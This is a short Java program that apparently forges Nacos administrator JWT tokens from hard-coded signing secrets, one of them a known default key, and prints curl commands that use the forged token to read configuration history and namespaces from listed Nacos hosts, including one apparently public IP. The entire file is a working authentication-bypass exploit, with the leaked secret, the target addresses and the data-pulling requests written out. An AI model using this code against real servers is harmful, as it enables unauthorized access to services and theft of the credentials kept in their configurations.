package com.aias.nacos;

import com.aias.nacos.jwt.NacosJwtParser;

public class NacosJwtApplication {
    public static final Long DEFAULT_TOKEN_EXPIRE_SECONDS = 18_000L;
    
    public static void main(String[] args) {
        //        String host = "http://172.16.19.73:8848";
        //        String host = "http://221.4.208.3:8848";
        //        String host = "http://10.115.37.237:8848";
        String host = "http://10.244.12.9:39001";
        //        String host = "http://10.191.23.122:28848";
        
        //                String request = "curl -X GET " + host + "/nacos/v2/cs/config?dataId=expos-admin-server.yaml&group=DEFAULT_GROUP&namespaceId=demo&accessToken=";
        String request = "curl -X GET " + host + "/nacos/v2/cs/history/configs?namespaceId=demo&accessToken=";
        //        String request = "curl -X GET " + host + "/nacos/v2/console/namespace/list";
        //        String tokenSecretKey = "SecretKey012345678901234567890123456789012345678901234567890123456789";
        String tokenSecretKey = "YXNkbGthaHNkYWxraHNkYXNmYXNkbGtxd2xlcW8yZWlwMTJvaTMxMjN3ZXFzZGFzY2doamts";
        NacosJwtParser jwtParser = new NacosJwtParser(tokenSecretKey);
        String userName = "nacos";
        String token = jwtParser.jwtBuilder().setUserName(userName).setExpiredTime(DEFAULT_TOKEN_EXPIRE_SECONDS).compact();
        System.out.println("secretKey: " + tokenSecretKey);
        System.out.println("userName: " + userName);
        System.out.println("token: " + token);
        System.out.println(request + token + "'");
        
    }
}
